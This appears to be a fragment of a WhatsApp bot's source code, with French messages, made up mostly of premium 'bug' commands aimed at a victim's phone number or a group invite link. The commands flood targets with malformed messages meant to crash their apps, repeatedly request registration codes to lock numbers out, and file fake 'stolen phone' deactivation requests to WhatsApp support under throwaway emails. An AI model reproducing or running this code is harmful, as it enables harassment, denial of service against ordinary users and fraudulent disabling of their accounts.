               b += 'Code:\n*[${a.serialNumber}]*\n'
               replygckev(b)
            }
            break
            
            //bug && war cases 
//⚠️do not edit cases otherwise bug not work
//bug cases 
case 'tout_effacer':
m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
case 'sylvers_react': {
if (!isPremium) return replygckev(mess.prem)
if (!m.quoted) return replygckev('Exemple usage: ${prefix + command} Veuillez repondre a une discussion')
await Kev.sendMessage(m.chat, { text: 'Bug send avec succes', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: '${ownername}'.repeat(10000), serverMessageId: 2 } }}, { quoted: kbug2 })
await sleep(2000)
await Kev.sendMessage(m.chat, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break
case 'sylvers2': {
if (!isPremium) return replygckev(mess.prem)
if (!args[0]) return replygckev('Usage ${prefix+command} amount\nExemple ${prefix+command} 5') 
amount = text * 30
for (let i = 0; i < amount; i++) {
await Kev.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: kbug2 })
}
}
break
case 'xxx': {
if (!isPremium) return replygckev(mess.prem)
if (!args[0]) return replygckev('Usage ${prefix+command} numero de la victime|nombre\nExemple ${prefix+command} 237xxxxxxxxxx|5') 
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Kev.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: kbug2 })
}
replygckev('Bug send avec succes a ${victim}')
}
break
case 'iosxxx2': {
if (!isPremium) return replygckev(mess.prem)
if (!text) return replygckev('Exemple usage: ${prefix + command} 5')
amount = text * 30
for (let i = 0; i < amount; i++) {
await Kev.relayMessage(m.chat, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
}
break
case 'iosxxx': {
if (!isPremium) return replygckev(mess.prem)
if (!text) return replygckev('Exemple:\n ${prefix + command} 237xxxxxxxxxx|5')
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Kev.relayMessage(victim, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
replygckev('Successfully Sent Bug To ${victim}')
}
break
case 'audioxxx2': {
if (!isPremium) return replygckev(mess.prem)
if (!text) return replygckev('Exemple usage: ${prefix + command} 5')
amount = text * 30
for (let i = 0; i < amount; i++) {
await Kev.sendMessage(m.chat, { "caption": '${ownername}', audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":'p',"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: kbug2 })
}
}
break
case 'audioxxx': {
if (!isPremium) return replygckev(mess.prem)
if (!text) return replygckev('Exemple usage:\n ${prefix + command} 237xxxxxxxxxx|5')
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Kev.sendMessage(victim, { "caption": '${ownername}', audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":'p',"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: kbug2 })
}
replygckev('Bug send avec succes a ${victim}')
}
break
case 'stickerxxx': {
if (!isPremium) return replygckev(mess.prem)
if (!text) return replygckev('Exemple: ${prefix + command} 237xxxxxxxxxx|5')
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Kev.sendVideoAsSticker(victim, ksteek, kbug2, { packname: packname, author: author })
}
replygckev('Bug send avec succes a ${victim}')
}
break
case 'stickerxxx2': {
if (!isPremium) return replygckev(mess.prem)
if (!text) return replygckev('Exemple: ${prefix + command} 5')
amount = text * 2
for (let i = 0; i < amount; i++) {
await Kev.sendVideoAsSticker(m.chat, ksteek, kbug2, { packname: packname, author: author })
}
}
break
case 'blockxxx2': {
if (!isPremium) return replygckev(mess.prem)
if (!text) return replygckev('Exemple: ${prefix + command} 5')
amount = text
KevOP = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
Kev.sendMessage(from, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: 'https://${KevOP}.com', comment: botname, jpegThumbnail: null } }, { quoted: kbug2 })
}
}
break
case 'blockxxx': {
if (!isPremium) return replygckev(mess.prem)
if (!text) return replygckev('Exemple: ${prefix + command} 237xxxxxxxxxx|5')
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
KevOP = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
Kev.sendMessage(victim, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: 'https://${KevOP}.com', comment: botname, jpegThumbnail: null } }, { quoted: kbug2 })
}
replygckev('Bug send avec succes a ${victim}')
}
break
case 'listexxx': {
if (!isPremium) return replygckev(mess.prem)
if (!text) return replygckev('Exemple:\n${prefix + command} 237xxxxxxxxxx|5')
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Kev.sendMessage(victim, { text: '' }, { quoted: kbug2 })
}
replygckev('Bug send avec succes a ${victim}')
}
break
case 'listexxx2': {
if (!isPremium) return replygckev(mess.prem)
if (!text) return replygckev('Exemple:\n${prefix + command} 5')
amount = text * 30
for (let i = 0; i < amount; i++) {
await Kev.sendMessage(from, { text: '' }, { quoted: kbug2 })
}
}
break
case 'ban_temporaire': {
if (!isPremium) return replygckev(mess.prem)
if (!text) return replygckev('Exemple: ${prefix + command} 237|6909137211')
if (!/|/.test(text)) return replygckev('donnees invalides!, Exemple: \n ${prefix + command} 237|6909137211')
let numbers = JSON.parse(fs.readFileSync('./recherche/tempban.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await replygckev('Effectuey : ${fullNo} pour une duree indeterminee. l'enregistrement sera interompu en cas d.arret du server.')
let { state, saveCreds } = await useMultiFileAuthState('session')
let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: '+${fullNo}',
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log('Invalid Number (Possibility of Interrupted Registration): +${res.login}')
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./recherche/tempban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break
case 'sylvers_ios':{
if (!isPremium) return replygckev(mess.prem)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237xxxxxxxxxx')
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
Kev.relayMessage(from,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": victim,
"participant": victim,
"quotedMessage": {
"conversation": pluton1
},
"disappearingMode": {
"initiator": "CHANGED_IN_CHAT",
"trigger": "CHAT_SETTING"
}
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
},{messageId: null})
}
replygckev('*Bug sendoff avec succes  a ${victim} Veuillez faire une pause de 3 minutes*')
}
break
case 'iosgooglexxx': {
if (!isPremium) return replygckev(mess.prem)
if (!args[0]) return replygckev('Usage ${prefix+command} number\nExemple ${prefix+command} 237xxxxxxxxxx')
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
Kev.sendMessage(victim,{
text: 'https://google.com',
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: kenv6,
body: '###############################',
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
replygckev('*Bug send a ${victim} Veuillez faire une pause de 3 minutes*')
}
break
case 'iosgooglexxx2': {
if (!isPremium) return replygckev(mess.prem)
if (!args[0]) return replygckev('Usage ${prefix+command} amount\nExemple ${prefix+command} 5')
amount = '${encodeURI(text)}'
for (let i = 0; i < amount; i++) {
Kev.sendMessage(m.chat,{
text: 'https://google.com',
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: kenv6,
body: '###############################',
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
replygckev('*Bug send a ${amount} Veuillez faire une pause de 3 minutes*')
}
break
case 'ioscrashxxx':
if (!isPremium) return replygckev(mess.prem)
if (!args[0]) return replygckev('Usage ${prefix+command} number\nExemple ${prefix+command} 237xxxxxxxxxx')
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
Kev.relayMessage(victim,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replygckev('*Bug send a ${victim} Veuillez faire une pause de 3 minutes*')
break
case 'ioscrashxxx2':{
if (!isPremium) return replygckev(mess.prem)
if (!args[0]) return replygckev('Usage ${prefix+command} amount\nExemple ${prefix+command} 5')
 amount = '${encodeURI(text)}'
for (let i = 0; i < amount; i++) {
Kev.relayMessage(m.chat,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replygckev('* ${amount} Bug send ,Veuillez faire une pause de 3 minutes*')
}
break
case 'crashxxx':{
if (!isPremium) return replygckev(mess.prem)
 if (!args[0]) return replygckev('Usage ${prefix+command} number\nExemple ${prefix+command} 237xxxxxxxxxx')
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "100"
for (let i = 0; i < amount; i++) {
KevinouCrashy(pushname,victim)
await sleep(3000)
}
replygckev('*Bug send a ${victim} Veuillez faire une pause de 3 minutes*')
}
break
case 'crashxxx2':
if (!isPremium) return replygckev(mess.prem)
if (!args[0]) return replygckev('Usage ${prefix+command} nombre\nExemple ${prefix+command} 5')
 amount = '${encodeURI(text)}'
for (let i = 0; i < amount; i++) {
KevinouCrashy(pushname,m.chat)
await sleep(3000)
}
replygckev('*${amount} Bug send, Veuillez faire une pause de 3 minutes*')
break
case 'nombre_bug': {
if (!isPremium) return replygckev(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} amount\nExemple ${prefix+command} 5')
amount = '${encodeURI(text)}'
for (let i = 0; i < amount; i++) {
const kevinoubug1 = '${pluton1}'
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": '${moment(1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}',
"title": kevinoubug1,
}
}), { userJid: from, quoted : m})
Kev.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygckev('*${amount} Bug send,  Veuillez faire une pause de 3 minutes*')
break
case 'pm_bugxxx' :{
 if (!isPremium) return replygckev(mess.premium)
 if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const kevinoubug1 = '${pluton1}'
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": '${moment(1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}',
"title": kevinoubug1,
}
}), { userJid: from, quoted : m})
Kev.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygckev('*Bug send a ${victim} Veuillez faire une pause de 3 minutes*')
break
case 'bug_temp' : {
if (!isPremium) return replygckev(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const kevinoubug1 = satan2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": '${moment(1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}',
"title": kevinoubug1,
}
}), { userJid: from, quoted : m})
Kev.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygckev('*Bug send a ${victim} Veuillez faire une pause de 3 minutes*')
break
case 'bug_document': {
if (!isPremium) return replygckev(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
await loading()
if (args.length < 1) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const kevinoubug1 = '${pluton1}'
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": '${moment(1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}',
"title": kevinoubug1,
}
}), { userJid: from, quoted : m})
Kev.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygckev('*Bug send a ${victim} Veuillez faire une pause de 3 minutes*')
break
case 'bug_ilimitey' : {
if (!isPremium) return replygckev(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const kevinoubug1 = poseidon3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": '${moment(1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}',
"title": kevinoubug1,
}
}), { userJid: from, quoted : m})
Kev.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygckev('*Bug send a ${victim} Veuillez faire une pause de 3 minutes*')
break
case 'bom_bug': {
if (!isPremium) return replygckev(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const kevinoubug1 = saturne4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": '${moment(1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}',
"title": kevinoubug1,
}
}), { userJid: from, quoted : m})
Kev.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygckev('*Bug send a ${victim} Veuillez faire une pause de 3 minutes*')
break
case 'lady_bug' : {
if (!isPremium) return replygckev(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const kevinoubug1 = satan2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": '${moment(1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}',
"title": kevinoubug1,
}
}), { userJid: from, quoted : m})
Kev.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygckev('*Bug send a ${victim} Veuillez faire une pause de 3 minutes*')
break
case 'kevinou_bug': {
if (!isPremium) return replygckev(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": '${botname}',
"orderTitle": " TROLLY BUG ", 
"sellerJid": "237652258844@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
Kev.relayMessage(victim, order.message, { messageId: order.key.id })
}
replygckev('*Bug send a ${victim} Veuillez faire une pause de 3 minutes*')
}
break
case 'groupe_bomb' : {
if (!isPremium) return replygckev(mess.premium)
 if (!args[0]) return replygckev('Usage ${prefix+command} lien\nExemple ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg')
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let kevgc = await Kev.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const kevinoubug1 = '${pluton1}'
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": '${moment(1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}',
"title": kevinoubug1,
}
}), { userJid: from, quoted : m})
Kev.relayMessage(kevgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygckev('*Bug send a ${kevgc} Veuillez faire une pause de 3 minutes*')
}
break
case 'groupe_bugtemp' :  {
if (!isPremium) return replygckev(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} lien\nExemple ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg')
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let kevgc = await Kev.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const kevinoubug1 = jupiter5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": '${moment(1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}',
"title": kevinoubug1,
}
}), { userJid: from, quoted : m})
Kev.relayMessage(kevgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygckev('*Bug send a ${kevgc} Veuillez faire une pause de 3 minutes*')
}
break
case 'sylvers_groupebug' :  {
if (!isPremium) return replygckev(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} lien\nExemple ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg')
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let kevgc = await Kev.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const kevinoubug1 = satan2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": '${moment(1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}',
"title": kevinoubug1,
}
}), { userJid: from, quoted : m})
Kev.relayMessage(kevgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygckev('*Bug send a  ${kevgc} Veuillez faire une pause de 3 minutes*')
}
break
case 'bombe_bug' :  {
if (!isPremium) return replygckev(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} lien\nExemple ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg')
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let kevgc = await haikal.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const kevinoubug1 = saturne4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": '${moment(1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}',
"title": kevinoubug1,
}
}), { userJid: from, quoted : m})
Kev.relayMessage(kevgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygckev('*Bug send a ${kevgc} Veuillez faire une pause de 3 minutes*')
}
break
case 'groupe_bugilimitey' :  {
if (!isPremium) return replygckev(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} lien\nExemple ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg')
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let kevgc = await Kev.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const kevinoubug1 = poseidon3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": '${moment(1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}',
"title": kevinoubug1,
}
}), { userJid: from, quoted : m})
Kev.relayMessage(kevgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygckev('*Bug send a ${kevgc} Veuillez faire une pause de 3 minutes*')
}
break
case 'groupe_trollbug' :  {
if (!isPremium) return replygckev(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} lien\nExemple ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg')
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let kevgc = await Kev.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": '${botname}',
"orderTitle": " TROLL BUG ", 
"sellerJid": "237652258844@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
Kev.relayMessage(kevgc, order.message, { messageId: order.key.id })
}
replygckev('*Bug send a ${kevgc} Veuillez faire une pause de 3 minutes*')
}
break
case 'groupedoc_bug' :  {
if (!isPremium) return replygckev(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} lien\nExemple ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg')
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let kevgc = await Kev.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const kevinoubug1 = '${pluton1}'
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": '${moment(1000).tz("Africa/Abidjan").format("DD/MM/YYYY HH:mm:ss")}',
"title": kevinoubug1,
}
}), { userJid: from, quoted : m})
Kev.relayMessage(kevgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygckev('*Bug send a ${kevgc} Veuillez faire une pause de 3 minutes*')
} 
break

//ban/unban cases
case 'out': case 'verif':{
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
let kevnumx = '+'+q.split("|")[0].replace(/[^0-9]/g, '')
let kevtesx = await Kev.onWhatsApp(kevnumx)
if (kevtesx.length == 0) return replygckev('Veuillez entrer un numero WhatsApp valide!!!')
let axioss = require("axios")  
let kevxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = kevxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(kevxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", kevnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Kev.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'ban1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
let kevnumx = '+'+q.split("|")[0].replace(/[^0-9]/g, '')
let kevtesx = await Kev.onWhatsApp(kevnumx)
if (kevtesx.length == 0) return replygckev('Veuillez entrer un numero WhatsApp valide!!!')
let axioss = require("axios")  
let kevxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = kevxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(kevxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", kevnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Kev.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'ban2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
let kevnumx = '+'+q.split("|")[0].replace(/[^0-9]/g, '')
let kevtesx = await Kev.onWhatsApp(kevnumx)
if (kevtesx.length == 0) return replygckev('Veuillez entrer un numero WhatsApp valide!!!')
let axioss = require("axios")  
let kevxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = kevxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(kevxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", kevnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Kev.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'ban3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygckev('Usage ${prefix+command} numero\nExemple ${prefix+command} 237652258844')
let kevnumx = '+'+q.split("|")[0].replace(/[^0-9]/g, '')
let kevtesx = await Kev.onWhatsApp(kevnumx)
if (kevtesx.length == 0) return replygckev('Veuillez entrer un numero WhatsApp valide!!!')
let axioss = require("axios")  
let kevxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
